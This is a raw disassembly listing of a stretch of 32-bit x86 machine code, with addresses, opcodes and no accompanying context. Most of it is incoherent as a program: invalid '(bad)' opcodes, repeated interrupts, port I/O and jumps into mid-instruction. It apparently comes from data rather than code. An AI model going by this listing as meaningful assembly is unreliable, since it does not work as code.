  4242af:	adc    al,0x5e
  4242b1:	je     0x4242fd
  4242b3:	xor    BYTE PTR [edi],ch
  4242b5:	add    eax,0x808092df
  4242ba:	int    0x76
  4242bc:	std    
  4242bd:	int    0x76
  4242bf:	std    
  4242c0:	int    0xa6
  4242c2:	std    
  4242c3:	int    0x76
  4242c5:	std    
  4242c6:	cmp    ecx,ecx
  4242c8:	cmp    ebp,DWORD PTR [ecx-0x2cd7522d]
  4242ce:	in     al,dx
  4242cf:	xchg   edx,eax
  4242d0:	push   ebx
  4242d1:	popf   
  4242d2:	int    0x76
  4242d4:	adc    DWORD PTR [ebx+0x6d],esi
  4242d7:	adc    al,0x87
  4242d9:	ror    ebp,cl
  4242db:	jl     0x42430d
  4242dd:	xchg   DWORD PTR [ebp-0x5272f578],ecx
  4242e3:	int    0x8d
  4242e5:	std    
  4242e6:	int    0x96
  4242e8:	std    
  4242e9:	cmp    ecx,DWORD PTR [edi]
  4242eb:	cmp    ebx,ecx
  4242ed:	shr    ebx,cl
  4242ef:	xchg   edx,eax
  4242f0:	shr    edx,cl
  4242f2:	sub    BYTE PTR [ebx+0x13],dl
  4242f5:	int    0x96
  4242f7:	std    
  4242f8:	or     cl,BYTE PTR [ebp+0xa88cd95]
  4242fe:	lea    esi,[ebp+0x3bfd8dcd]
  424304:	cdq    
  424305:	cmp    esi,eax
  424307:	shl    edx,cl
  424309:	sub    bl,dl
  42430b:	repz xchg edx,eax
  42430d:	push   ebx
  42430e:	jecxz  0x4242dd
  424310:	lea    esi,[ebp-0x792becbd]
  424316:	xchg   DWORD PTR [ebp-0x6a72f578],ecx
  42431c:	int    0x8d
  42431e:	std    
  42431f:	int    0x96
  424321:	std    
  424322:	cmp    ecx,DWORD PTR [edi]
  424324:	cmp    ebx,ecx
  424326:	shr    ebx,cl
  424328:	xchg   edx,eax
  424329:	shr    edx,cl
  42432b:	sub    BYTE PTR [ebx+0x13],dl
  42432e:	xchg   DWORD PTR [esp+ecx*2-0x37],edi
  424332:	jbe    0x4242d1
  424334:	popa   
  424335:	and    DWORD PTR [esi-0x777278cb],eax
  42433b:	or     cl,BYTE PTR [ebp-0x32781313]
  424341:	(bad)  
  424342:	in     eax,dx
  424343:	int    0x76
  424345:	dec    esp
  424346:	int    0x1
  424348:	adc    DWORD PTR [ecx+0x718080],eax
  42434e:	xor    ch,cl
  424350:	jbe    0x42439e
  424352:	add    dh,dl
  424354:	in     eax,dx
  424355:	int    0x1
  424357:	adc    DWORD PTR [ecx+0x70008080],eax
  42435d:	dec    esp
  42435e:	leave  
  42435f:	jbe    0x424306
  424361:	pop    DWORD PTR [ebp*1-0x5a89368a]
  424368:	dec    edx
  424369:	pop    ss
  42436a:	xchg   BYTE PTR ds:0xcdfd8dcd,dh
  424370:	xchg   esi,eax
  424371:	std    
  424372:	cmp    ecx,DWORD PTR [edi]
  424374:	cmp    ebx,ecx
  424376:	shr    ebx,cl
  424378:	xchg   edx,eax
  424379:	shr    edx,cl
  42437b:	sub    BYTE PTR [ebx+0x13],dl
  42437e:	or     dh,BYTE PTR [esi-0x4b]
  424381:	inc    ebx
  424382:	jge    0x42435a
  424384:	pop    eax
  424385:	int    0x76
  424387:	stc    
  424388:	int    0x8d
  42438a:	stc    
  42438b:	cmp    edi,DWORD PTR [ecx+0x3b]
  42438e:	lock shl edx,cl
  424391:	sub    bl,dl
  424393:	mov    ebp,0xcdd35392
  424398:	lea    esp,[ebp+0x3ba596cd]
  42439e:	fnstcw WORD PTR [ebx]
  4243a0:	psrlq  mm5,mm2
  4243a3:	sub    BYTE PTR [edi+0x4c76cd9d],al
  4243a9:	int    0x1
  4243ab:	adc    DWORD PTR [ecx-0x142c7f80],eax
  4243b1:	xchg   edx,eax
  4243b2:	push   ebx
  4243b3:	jecxz  0x4243e4
  4243b5:	rcl    ebp,1
  4243b7:	bound  eax,QWORD PTR [eax]
  4243b9:	jo     0x4243ef
  4243bb:	int    0x76
  4243bd:	std    
  4243be:	int    0x8d
  4243c0:	std    
  4243c1:	cmp    edi,DWORD PTR [ecx+0x3b]
  4243c4:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4243cb:	push   ebx
  4243cc:	rol    DWORD PTR [ebx+0x76],cl
  4243cf:	mov    ch,0xd6
  4243d1:	and    ch,cl
  4243d3:	jbe    0x424372
  4243d5:	int    0x8d
  4243d7:	popf   
  4243d8:	cmp    esi,eax
  4243da:	cmp    edi,DWORD PTR [ecx-0x2d]
  4243dd:	mov    ebp,0x28f2d392
  4243e2:	push   ebx
  4243e3:	jge    0x424428
  4243e5:	fld    TBYTE PTR [edi]
  4243e7:	pop    es
  4243e8:	xchg   esp,eax
  4243e9:	add    BYTE PTR [eax],al
  4243eb:	add    ch,cl
  4243ed:	jbe    0x4243ec
  4243ef:	int    0x8d
  4243f1:	std    
  4243f2:	cmp    edi,DWORD PTR [ecx+0x3b]
  4243f5:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4243fc:	push   ebx
  4243fd:	rol    DWORD PTR [ebx+0x76],cl
  424400:	mov    ch,0xd6
  424402:	and    ch,cl
  424404:	jbe    0x4243ff
  424406:	int    0x8d
  424408:	stc    
  424409:	cmp    edi,DWORD PTR [ecx+0x3b]
  42440c:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  424413:	push   ebx
  424414:	rol    DWORD PTR [ecx-0x5f14428a],cl
  42441a:	add    DWORD PTR [eax-0x12893680],0x67f1048e
  424424:	leave  
  424425:	jbe    0x42441c
  424427:	fdivr  st,st(4)
  424429:	sbb    al,0xb
  42442b:	int    0xa6
  42442d:	std    
  42442e:	int    0x76
  424430:	std    
  424431:	cmp    ebp,DWORD PTR [ecx-0x132c36c5]
  424437:	xchg   edx,eax
  424438:	shr    DWORD PTR [ebp-0x1462acd8],cl
  42443e:	sbb    al,BYTE PTR [ecx+0x76cd8080]
  424444:	std    
  424445:	int    0x8d
  424447:	std    
  424448:	cmp    edi,DWORD PTR [ecx+0x3b]
  42444b:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  424452:	push   ebx
  424453:	ror    DWORD PTR [edx],cl
  424455:	jbe    0x424444
  424457:	int    0x76
  424459:	std    
  42445a:	int    0x8d
  42445c:	std    
  42445d:	cmp    edi,DWORD PTR [ecx+0x3b]
  424460:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  424467:	push   ebx
  424468:	ror    DWORD PTR [edx],cl
  42446a:	jbe    0x424461
  42446c:	int    0x8d
  42446e:	std    
  42446f:	int    0x76
  424471:	std    
  424472:	cmp    ecx,DWORD PTR [edi]
  424474:	cmp    ecx,ecx
  424476:	shr    DWORD PTR [ebp-0x6d142cd8],cl
  42447c:	push   ebx
  42447d:	jge    0x42444c
  42447f:	jbe    0x424416
  424481:	inc    ebx
  424482:	jge    0x424458
  424484:	xchg   ch,cl
  424486:	test   BYTE PTR ds:0xcded760a,bl
  42448c:	jbe    0x42443b
  42448e:	int    0x84
  424490:	sbb    eax,0xcdf5760a
  424495:	jbe    0x424494
  424497:	int    0x8d
  424499:	std    
  42449a:	cmp    edi,DWORD PTR [ecx+0x3b]
  42449d:	lock shl edx,cl
  4244a0:	sub    bl,dl
  4244a2:	mov    ebp,0xcdd35392
  4244a7:	(bad)  
  4244a8:	in     eax,dx
  4244a9:	inc    ebx
  4244aa:	rcl    esp,cl
  4244ac:	push   esp
  4244ad:	int    0x76
  4244af:	std    
  4244b0:	int    0x8d
  4244b2:	std    
  4244b3:	cmp    esi,eax
  4244b5:	cmp    edi,DWORD PTR [ecx-0x2d]
  4244b8:	repnz sub bl,dl
  4244bb:	mov    ebp,0xcdd35392
  4244c0:	(bad)  
  4244c1:	in     eax,dx
  4244c2:	shr    ebx,cl
  4244c4:	sub    al,BYTE PTR [ebx-0x2d]
  4244c7:	aam    0x1c
  4244c9:	int    0x8d
  4244cb:	in     eax,dx
  4244cc:	int    0x76
  4244ce:	dec    esp
  4244cf:	int    0x1
  4244d1:	adc    DWORD PTR [ecx-0x44d07f80],eax
  4244d7:	retf   
  4244d8:	jno    0x4244da
  4244da:	(bad)  
  4244db:	mov    ch,0x0
  4244dd:	jo     0x424467
  4244df:	in     al,dx
  4244e0:	push   ds
  4244e1:	int    0x76
  4244e3:	cmc    
  4244e4:	xchg   DWORD PTR [esi-0x78],esi
  4244e7:	int    0x8d
  4244e9:	dec    esp
  4244ea:	int    0xa
  4244ec:	adc    DWORD PTR [ecx+0x6d048080],eax
  4244f2:	xchg   edx,eax
  4244f3:	jo     0x4244f5
  4244f5:	(bad)  
  4244f6:	mov    ch,0x0
  4244f8:	jno    0x424482
  4244fa:	or     dh,BYTE PTR [esi-0xb]
  4244fd:	int    0x76
  4244ff:	std    
  424500:	int    0x8d
  424502:	std    
  424503:	cmp    edi,DWORD PTR [ecx+0x3b]
  424506:	lock shl edx,cl
  424509:	sub    bl,dl
  42450b:	mov    ebp,0xcdd35392
  424510:	(bad)  
  424511:	cmc    
  424512:	inc    ebx
  424513:	ror    ebp,cl
  424515:	jbe    0x424510
  424517:	int    0x8d
  424519:	stc    
  42451a:	(bad)  
  42451b:	xor    DWORD PTR [ebx],edi
  42451d:	jns    0x42455a
  42451f:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  424526:	push   ebx
  424527:	rol    DWORD PTR [ecx+0x1cecbd76],cl
  42452d:	cmp    esi,eax
  42452f:	cmp    edi,DWORD PTR [ecx-0x2d]
  424532:	repnz sub bl,dl
  424535:	mov    ebp,0xcdd35392
  42453a:	(bad)  
  42453b:	cmc    
  42453c:	das    
  42453d:	rcl    ebx,1
  42453f:	int    0x8d
  424541:	lods   eax,DWORD PTR ds:[esi]
  424542:	or     al,BYTE PTR [edi+ebx*1-0x32068933]
  424549:	(bad)  
  42454a:	stc    
  42454b:	cmp    edi,DWORD PTR [ecx+0x3b]
  42454e:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  424555:	push   ebx
  424556:	rol    DWORD PTR [edi-0x2893263],cl
  42455c:	int    0x8d
  42455e:	std    
  42455f:	cmp    esi,eax
  424561:	cmp    edi,DWORD PTR [ecx-0x2d]
  424564:	repnz sub bl,dl
  424567:	mov    ebp,0xcdd35392
  42456c:	lea    ebp,[ebp+0x2f1f845e]
  424572:	push   es
  424573:	or     al,0xff
  424575:	add    BYTE PTR [eax],al
  424577:	int    0x76
  424579:	adc    ebp,ecx
  42457b:	lea    edx,[ecx]
  42457d:	ins    BYTE PTR es:[edi],dx
  42457e:	sar    DWORD PTR [ebp-0x30b330d8],cl
  424584:	test   BYTE PTR [eax-0x2cac7f80],al
  42458a:	int    0x8d
  42458c:	icebp  
  42458d:	push   esi
  42458e:	dec    ecx
  42458f:	and    DWORD PTR [esi-0x2ec14cb],eax
  424595:	add    BYTE PTR [eax],al
  424597:	int    0x76
  424599:	std    
  42459a:	int    0x8d
  42459c:	std    
  42459d:	cmp    edi,DWORD PTR [ecx+0x3b]
  4245a0:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4245a7:	push   ebx
  4245a8:	rcr    DWORD PTR [esi+0x76],cl
  4245ab:	mov    ebp,0x76cd88d6
  4245b0:	stc    
  4245b1:	int    0x8d
  4245b3:	stc    
  4245b4:	in     al,dx
  4245b5:	xchg   ch,cl
  4245b7:	jbe    0x4245b6
  4245b9:	int    0x8d
  4245bb:	std    
  4245bc:	cmp    esi,eax
  4245be:	cmp    edi,DWORD PTR [ecx-0x56]
  4245c1:	shl    edx,cl
  4245c3:	sub    bl,dl
  4245c5:	mov    ebp,0xd353a892
  4245ca:	arpl   bx,cx
  4245cc:	ror    BYTE PTR [eax-0x12326980],cl
  4245d2:	add    al,0xed
  4245d4:	xor    al,0xc9
  4245d6:	jbe    0x4245d5
  4245d8:	dec    ecx
  4245d9:	and    DWORD PTR [esi-0x528936cb],eax
  4245df:	inc    ecx
  4245e0:	and    DWORD PTR [esi+0x4c76cd35],eax
  4245e6:	or     dh,BYTE PTR [esi+0x4c]
  4245e9:	cwde   
  4245ea:	int    0x6d
  4245ec:	int    0x76
  4245ee:	std    
  4245ef:	int    0x96
  4245f1:	std    
  4245f2:	sar    bh,0x5f
  4245f5:	shl    DWORD PTR [ecx],1
  4245f7:	xchg   BYTE PTR ds:0x3ba8d33b,dh
  4245fd:	cdq    
  4245fe:	shr    edx,cl
  424600:	sub    bl,dl
  424602:	mov    ebp,0xcdd25392
  424607:	xchg   esi,eax
  424608:	mov    BYTE PTR [ebx-0xf],al
  42460b:	das    
  42460c:	add    eax,0x80808159
  424611:	int    0x76
  424613:	mov    ch,cl
  424615:	xchg   esi,eax
  424616:	mov    BYTE PTR [edi+0xa9a6470],al
  42461c:	xchg   esi,eax
  42461d:	cmc    
  42461e:	leave  
  42461f:	jbe    0x42461a
  424621:	popa   
  424622:	and    DWORD PTR [esi-0x68932cb],eax
  424628:	int    0x96
  42462a:	stc    
  42462b:	cmp    ebx,DWORD PTR [ecx+0x3b28ead3]
  424631:	rcl    ebx,cl
  424633:	mov    ebp,0xcdd25392
  424638:	xchg   esi,eax
  424639:	std    
  42463a:	int    0xe6
  42463c:	std    
  42463d:	cmp    esp,ebx
  42463f:	cmp    edi,edi
  424641:	shr    ecx,cl
  424643:	sub    bl,dl
  424645:	repz xchg edx,eax
  424647:	push   ebx
  424648:	fxch   st(5)
  42464a:	out    0xf5,al
  42464c:	pop    esi
  42464d:	xchg   esp,eax
  42464e:	leave  
  42464f:	fsubr  QWORD PTR [edi]
  424651:	add    eax,0x8080816b
  424656:	int    0x96
  424658:	cmc    
  424659:	int    0x76
  42465b:	mov    BYTE PTR [edi-0x7f7fd2f5],al
  424661:	or     ch,0x96
  424664:	mov    ch,cl
  424666:	out    0xf5,al
  424668:	xor    ebx,DWORD PTR [edx-0x21932ac]
  42466e:	pop    ebx
  42466f:	int    0xa6
  424671:	std    
  424672:	cmp    edi,edx
  424674:	cmp    ebp,DWORD PTR [ecx-0x2c6def2d]
  42467a:	in     eax,0x28
  42467c:	push   ebx
  42467d:	cld    
  42467e:	or     dl,BYTE PTR [esi+0x2fd943a5]
  424684:	add    eax,0x8080814f
  424689:	int    0x96
  42468b:	std    
  42468c:	int    0xe6
  42468e:	std    
  42468f:	cmp    esp,ebx
  424691:	cmp    edi,edi
  424693:	shl    ebx,cl
  424695:	xchg   edx,eax
  424696:	shr    ecx,cl
  424698:	sub    BYTE PTR [ebx-0x27],dl
  42469b:	or     dl,BYTE PTR [esi+0x4c76c911]
  4246a1:	mov    dl,0x21
  4246a3:	xchg   BYTE PTR ds:0xcdfd96cd,dh
  4246a9:	out    0xfd,al
  4246ab:	cmp    esp,ebx
  4246ad:	cmp    edi,edi
  4246af:	shl    ebx,cl
  4246b1:	xchg   edx,eax
  4246b2:	shr    ecx,cl
  4246b4:	sub    BYTE PTR [ebx-0x27],dl
  4246b7:	jmp    0x4246bb
  4246b9:	add    BYTE PTR [eax-0x2693280],0xcd
  4246c0:	(bad)  
  4246c1:	std    
  4246c2:	add    al,0xf7
  4246c4:	(bad)  
  4246c5:	cmp    esp,ebx
  4246c7:	sar    DWORD PTR [ecx-0x6d0c2cd8],cl
  4246cd:	push   ebx
  4246ce:	cdq    
  4246cf:	iret   
  4246d0:	ja     0x4246cb
  4246d2:	jecxz  0x4246c3
  4246d4:	inc    ebx
  4246d5:	cdq    
  4246d6:	das    
  4246d7:	add    al,0x21
  4246d9:	add    BYTE PTR [eax-0x3004cc80],0xe4
  4246e0:	jo     0x42466a
  4246e2:	or     dl,dh
  4246e4:	mov    ch,0x2f
  4246e6:	mov    ebx,0xea121a
  4246eb:	das    
  4246ec:	add    BYTE PTR [eax-0x321269f6],0x96
  4246f3:	in     eax,dx
  4246f4:	xchg   DWORD PTR [eax],esi
  4246f6:	int    0xd6
  4246f8:	in     eax,dx
  4246f9:	xchg   DWORD PTR [eax-0x2d],edx
  4246fc:	repz sub bl,dl
  4246ff:	mov    ecx,0x2ffb5392
  424704:	mov    ebx,0x4cf3d31a
  424709:	adc    dh,bh
  42470b:	dec    ecx
  42470c:	and    DWORD PTR [esi-0x1229f5cb],eax
  424712:	or     dl,BYTE PTR [esi-0x12693243]
  424718:	int    0xd6
  42471a:	in     eax,dx
  42471b:	cmp    esp,ebx
  42471d:	add    al,0xf7
  42471f:	call   ebx
  424721:	repz xchg edx,eax
  424723:	sar    DWORD PTR [ecx-0x7866acd8],cl
  424729:	xchg   esi,eax
  42472a:	mov    BYTE PTR [edx],cl
  42472c:	xchg   esi,eax
  42472d:	in     eax,dx
  42472e:	int    0x96
  424730:	dec    esp
  424731:	int    0xd6
  424733:	dec    esp
  424734:	cmp    esp,ebx
  424736:	add    al,0xf7
  424738:	call   ebx
  42473a:	mov    ecx,0x92f3d328
  42473f:	push   ebx
  424740:	cdq    
  424741:	int    0xd6
  424743:	mov    ebp,0x32d6fb43
  424748:	int    0x96
  42474a:	dec    esp
  42474b:	int    0xd6
  42474d:	dec    esp
  42474e:	cmp    esp,ebx
  424750:	add    al,0xf7
  424752:	call   ebx
  424754:	mov    ecx,0x92f3d328
  424759:	push   ebx
  42475a:	cdq    
  42475b:	int    0xd6
  42475d:	mov    ebp,0x88d6fb43
  424762:	int    0x96
  424764:	in     eax,dx
  424765:	int    0xd6
  424767:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424768:	add    DWORD PTR [edx+0x4],0x8d0092c9
  42476f:	mov    ch,0x2f
  424771:	push   es
  424772:	xchg   ebx,eax
  424773:	add    BYTE PTR [eax],al
  424775:	add    BYTE PTR [ecx-0x6932ee5a],al
  42477b:	stc    
  42477c:	int    0xd6
  42477e:	stc    
  42477f:	cmp    esp,ebx
  424781:	add    al,0xf7
  424783:	call   ebx
  424785:	mov    ecx,0x92f3d328
  42478a:	push   ebx
  42478b:	cdq    
  42478c:	int    0xd6
  42478e:	adc    ebp,ecx
  424790:	out    0xf5,al
  424792:	inc    ebx
  424793:	aam    0xd9
  424795:	in     al,0x77
  424797:	sub    al,0xcd
  424799:	xchg   esi,eax
  42479a:	std    
  42479b:	int    0xd6
  42479d:	std    
  42479e:	cmp    esp,ebx
  4247a0:	add    al,0xf7
  4247a2:	call   ebx
  4247a4:	repz xchg edx,eax
  4247a6:	sar    DWORD PTR [ecx+0x53c58728],cl
  4247ac:	cdq    
  4247ad:	int    0x9c
  4247af:	test   BYTE PTR [ebx-0x1e],al
  4247b2:	das    
  4247b3:	push   es
  4247b4:	test   BYTE PTR [eax],al
  4247b6:	add    BYTE PTR [eax],al
  4247b8:	arpl   bp,cx
  4247ba:	jbe    0x424769
  4247bc:	cmp    edx,ebx
  4247be:	int    0x8d
  4247c0:	lods   eax,DWORD PTR ds:[esi]
  4247c1:	add    al,0x2
  4247c3:	jmp    FWORD PTR [edx+0x76cd4aec]
  4247c9:	std    
  4247ca:	cmp    edx,ebx
  4247cc:	int    0x8d
  4247ce:	std    
  4247cf:	cmp    ecx,DWORD PTR [edi]
  4247d1:	shl    edx,cl
  4247d3:	sub    bl,dl
  4247d5:	mov    ebp,0xa8d35392
  4247da:	retf   
  4247db:	ror    BYTE PTR [eax-0x12326980],cl
  4247e1:	adc    ch,ch
  4247e3:	xchg   ebp,eax
  4247e4:	add    BYTE PTR [eax-0x2893680],0x49
  4247eb:	and    DWORD PTR [esi-0x68936cb],eax
  4247f1:	inc    ecx
  4247f2:	and    DWORD PTR [esi-0x28932cb],eax
  4247f8:	int    0x8d
  4247fa:	std    
  4247fb:	cwde   
  4247fc:	call   0x8621:0xd169ffc0
  424803:	xor    eax,0xbdd3793b
  424808:	xchg   edx,eax
  424809:	mov    al,ds:0xf2d3133b
  42480e:	sub    BYTE PTR [ebx-0x2d],dl
  424811:	or     dh,BYTE PTR [esi-0x53]
  424814:	int    0x76
  424816:	std    
  424817:	int    0x8d
  424819:	std    
  42481a:	cmp    edi,DWORD PTR [ecx-0x2d]
  42481d:	mov    ebp,0xd3133b92
  424822:	repnz sub BYTE PTR [ebx-0x2d],dl
  424826:	or     dh,BYTE PTR [esi-0xf]
  424829:	int    0xe6
  42482b:	and    al,0xcd
  42482d:	jbe    0x42481c
  42482f:	int    0x8d
  424831:	in     eax,dx
  424832:	cmp    edx,ebx
  424834:	or     dh,BYTE PTR [esi-0x13]
  424837:	adc    dh,BYTE PTR [esi-0x13]
  42483a:	dec    ecx
  42483b:	mov    al,ds:0x76cd3586
  424840:	cmc    
  424841:	int    0x8d
  424843:	cmc    
  424844:	cmp    edx,ebx
  424846:	or     dh,BYTE PTR [esi-0xb]
  424849:	adc    dh,BYTE PTR [esi-0xb]
  42484c:	dec    ecx
  42484d:	lahf   
  42484e:	xchg   BYTE PTR ds:0xcd1176cd,dh
  424854:	lea    edx,[ecx]
  424856:	cmp    edx,ebx
  424858:	or     dh,BYTE PTR [esi+0x11]
  42485b:	adc    dh,BYTE PTR [esi+0x11]
  42485e:	imul   esp,DWORD PTR [ecx],0x76cd3586
  424864:	mov    ch,0xcd
  424866:	lea    esi,[ebp+0x760ad33b]
  42486c:	mov    ch,0x12
  42486e:	jbe    0x424825
  424870:	dec    ecx
  424871:	and    DWORD PTR [ebp+esi*1+0x212476c9],eax
  424878:	hlt    
  424879:	mov    esi,DWORD PTR ds:0x68876cd
  42487f:	ins    DWORD PTR es:[edi],dx
  424880:	das    
  424881:	add    eax,0x80808551
  424886:	int    0x76
  424888:	dec    esp
  424889:	push   es
  42488a:	ins    DWORD PTR es:[edi],dx
  42488b:	das    
  42488c:	add    eax,0x80808538
  424891:	int    0x76
  424893:	sbb    al,0x6
  424895:	ins    DWORD PTR es:[edi],dx
  424896:	das    
  424897:	add    eax,0x80808523
  42489c:	int    0x76
  42489e:	and    al,0xcd
  4248a0:	jbe    0x4248c6
  4248a2:	int    0x8d
  4248a4:	mov    bl,dl
  4248a6:	mov    ebp,0x39af5692
  4248ab:	add    BYTE PTR [eax+0x2f815eb8],0x6
  4248b2:	add    DWORD PTR [ebp+0x76cd8080],0xfd8dcdfd
  4248bc:	cmp    edi,DWORD PTR [ecx-0x2d]
  4248bf:	mov    ebp,0xd3133b92
  4248c4:	repnz sub BYTE PTR [ebx-0x2d],dl
  4248c8:	or     dh,BYTE PTR [esi-0xf]
  4248cb:	int    0x76
  4248cd:	std    
  4248ce:	int    0x76
  4248d0:	std    
  4248d1:	int    0x76
  4248d3:	mov    ch,cl
  4248d5:	lea    ecx,[eax-0x329b8379]
  4248db:	outs   dx,BYTE PTR ds:[esi]
  4248dc:	jo     0x4248e8
  4248de:	lea    esp,[esi+eax*1]
  4248e1:	ins    DWORD PTR es:[edi],dx
  4248e2:	das    
  4248e3:	add    eax,0x808084f0
  4248e8:	leave  
  4248e9:	jbe    0x424880
  4248eb:	dec    ecx
  4248ec:	and    DWORD PTR [eax+0x35],edi
  4248ef:	int    0x76
  4248f1:	xchg   ebp,eax
  4248f2:	pop    ebx
  4248f3:	int    0xa6
  4248f5:	xchg   ebp,eax
  4248f6:	cmp    edi,DWORD PTR [ecx+0x3b]
  4248f9:	loop   0x4248ce
  4248fb:	mov    ebp,0x28e5d392
  424900:	push   ebx
  424901:	popf   
  424902:	or     ah,BYTE PTR [esi-0x289326b]
  424908:	int    0x76
  42490a:	std    
  42490b:	int    0x8
  42490d:	sub    eax,0xcd808081
  424912:	xor    ch,cl
  424914:	bound  esp,QWORD PTR [edi+eax*4+0x30]
  424918:	int    0x76
  42491a:	std    
  42491b:	int    0x76
  42491d:	std    
  42491e:	int    0x8
  424920:	and    eax,0xcd808081
  424925:	sbb    al,0xa
  424927:	xchg   esi,eax
  424928:	dec    esp
  424929:	inc    ebx
  42492a:	fst    st(6)
  42492c:	push   0xffffffcd
  42492e:	(bad)  
  42492f:	cmc    
  424930:	int    0x8
  424932:	adc    DWORD PTR [ecx-0x69307f80],eax
  424938:	lods   eax,DWORD PTR ds:[esi]
  424939:	(bad)  
  42493a:	int    0x96
  42493c:	cmc    
  42493d:	cmp    ecx,DWORD PTR [edi]
  42493f:	add    al,0xfb
  424941:	call   ebx
  424943:	jmp    0x4248d7
  424945:	shr    edx,cl
  424947:	sub    BYTE PTR [ebx-0x1d],dl
  42494a:	int    0x8d
  42494c:	dec    esp
  42494d:	bound  eax,QWORD PTR [eax]
  42494f:	xchg   ecx,eax
  424950:	jo     0x4249ad
  424952:	add    BYTE PTR [eax+0x24],dh
  424955:	int    0x8d
  424957:	dec    esp
  424958:	int    0x6e
  42495a:	xchg   esp,eax
  42495b:	int    0x7e
  42495d:	jo     0x424992
  42495f:	jge    0x4249d2
  424961:	xchg   ebp,eax
  424963:	jo     0x424922
  424965:	dec    esi
  424966:	xchg   BYTE PTR [eax+0x248dcd80],al
  42496c:	int    0x8
  42496e:	xor    eax,0xa808081
  424973:	sbb    al,0x0
  424975:	xchg   ecx,eax
  424976:	xchg   esp,eax
  424977:	add    dh,dl
  424979:	mov    BYTE PTR [ebx-0x43],bl
  42497c:	or     eax,0xcd808084
  424981:	pop    ebx
  424982:	fs xchg ebp,edx
  424985:	das    
  424986:	mov    ebx,0x74cf1452
  42498b:	xor    BYTE PTR [edx+ecx*1],bl
  42498e:	jbe    0x4249ac
  424990:	int    0x76
  424992:	std    
  424993:	int    0x8d
  424995:	std    
  424996:	cmp    edi,DWORD PTR [ecx+0x4]
  424999:	add    bh,bh
  42499b:	shl    edx,cl
  42499d:	sub    bl,dl
  42499f:	mov    ebp,0x2fd35392
  4249a4:	mov    ebx,0x960a868a
  4249a9:	and    al,0x43
  4249ab:	jge    0x4249dc
  4249ad:	add    eax,0x808080e9
  4249b2:	int    0x76
  4249b4:	std    
  4249b5:	int    0x8d
  4249b7:	std    
  4249b8:	cmp    edi,DWORD PTR [ecx+0x4]
  4249bb:	add    bh,bh
  4249bd:	shl    edx,cl
  4249bf:	sub    bl,dl
  4249c1:	mov    ebp,0xad35392
  4249c6:	jbe    0x42496d
  4249c8:	int    0x76
  4249ca:	stc    
  4249cb:	int    0x8d
  4249cd:	stc    
  4249ce:	add    al,0x2
  4249d0:	(bad)  
  4249d1:	cmp    edi,DWORD PTR [ecx-0x2d]
  4249d4:	repnz sub bl,dl
  4249d7:	mov    ebp,0x2fd35392
  4249dc:	mov    ebx,0x7d33868a
  4249e1:	pop    esi
  4249e2:	lea    esp,[ebp-0x7f2ef7d1]
  4249e8:	add    BYTE PTR [eax+0x41c8dcd],0xd3
  4249ef:	mov    BYTE PTR [edx],cl
  4249f1:	lea    ebx,[esp+ebp*8]
  4249f4:	xchg   ebp,ecx
  4249f6:	lea    ebx,[ecx*8+0x31cd5c52]
  4249fd:	or     dh,BYTE PTR [esi-0x63]
  424a00:	jl     0x424a08
  424a02:	icebp  
  424a03:	aam    0x89
  424a05:	clc    
  424a06:	icebp  
  424a07:	sub    edx,edx
  424a09:	xchg   DWORD PTR [esi-0x63],esi
  424a0c:	in     al,dx
  424a0d:	xchg   edx,eax
  424a0e:	int    0xd2
  424a10:	jo     0x4249df
  424a12:	outs   dx,BYTE PTR ds:[esi]
  424a13:	test   BYTE PTR [edi+0x63bd70c5],al
  424a19:	test   DWORD PTR [eax+0x1c76cd80],eax
  424a1f:	int    0x7c
  424a21:	mov    BYTE PTR [edx],cl
  424a23:	lea    ebx,[ebp-0x32027233]
  424a29:	xchg   esi,eax
  424a2a:	std    
  424a2b:	cmp    ecx,DWORD PTR [edi]
  424a2d:	add    al,0xfb
  424a2f:	call   ebx
  424a31:	jmp    0x4249c5
  424a33:	shr    edx,cl
  424a35:	sub    BYTE PTR [ebx+0x13],dl
  424a38:	pop    esi
  424a39:	lea    ebx,[ebp-0x7232e32c]
  424a3f:	mov    BYTE PTR [edi-0x29ffb384],al
  424a45:	popf   
  424a46:	int    0x6c
  424a48:	test   BYTE PTR [ecx-0x79],dh
  424a4b:	lds    esi,FWORD PTR [eax-0x43]
  424a4e:	add    eax,DWORD PTR [edi+0x76cd8080]
  424a54:	sbb    al,0xcd
  424a56:	(bad)  
  424a57:	stc    
  424a58:	int    0x96
  424a5a:	stc    
  424a5b:	cmp    ecx,DWORD PTR [edi]
  424a5d:	shr    ebx,cl
  424a5f:	xchg   edx,eax
  424a60:	add    al,0xfb
  424a62:	inc    DWORD PTR [ebp*2+0x28ead33c]
  424a69:	push   ebx
  424a6a:	adc    eax,DWORD PTR [ecx-0x69325a73]
  424a70:	and    al,0xa
  424a72:	jbe    0x424a90
  424a74:	int    0x76
  424a76:	stc    
  424a77:	int    0x8d
  424a79:	stc    
  424a7a:	add    al,0x2
  424a7c:	(bad)  
  424a7d:	cmp    edi,DWORD PTR [ecx-0x2d]
  424a80:	repnz sub bl,dl
  424a83:	mov    ebp,0xcdd35392
  424a88:	lea    esp,[edi+ebp*1]
  424a8b:	mov    ebx,0x7d33867e
  424a90:	pop    esi
  424a91:	lea    esp,[ebp+0xa4072f]
  424a97:	add    BYTE PTR [eax],al
  424a99:	int    0x8
  424a9b:	and    eax,0x43808081
  424aa0:	sbb    al,0xd6
  424aa2:	cmp    ecx,ebp
  424aa4:	lea    edx,[ecx]
  424aa6:	int    0x8
  424aa8:	adc    DWORD PTR [ecx-0x69307f80],eax
  424aae:	lods   eax,DWORD PTR ds:[esi]
  424aaf:	(bad)  
  424ab0:	int    0x96
  424ab2:	adc    DWORD PTR [ebx],edi
  424ab4:	(bad)  
  424ab6:	sti    
  424ab7:	call   ebx
  424ab9:	jmp    0x424a4d
  424abb:	shr    edx,cl
  424abd:	sub    BYTE PTR [ebx-0x1d],dl
  424ac0:	int    0x8d
  424ac2:	dec    esp
  424ac3:	bound  eax,QWORD PTR [eax]
  424ac5:	xchg   ecx,eax
  424ac6:	xchg   esp,eax
  424ac7:	pop    ebx
  424ac8:	add    BYTE PTR [eax+0x24],dh
  424acb:	push   es
  424acc:	ins    DWORD PTR es:[edi],dx
  424acd:	das    
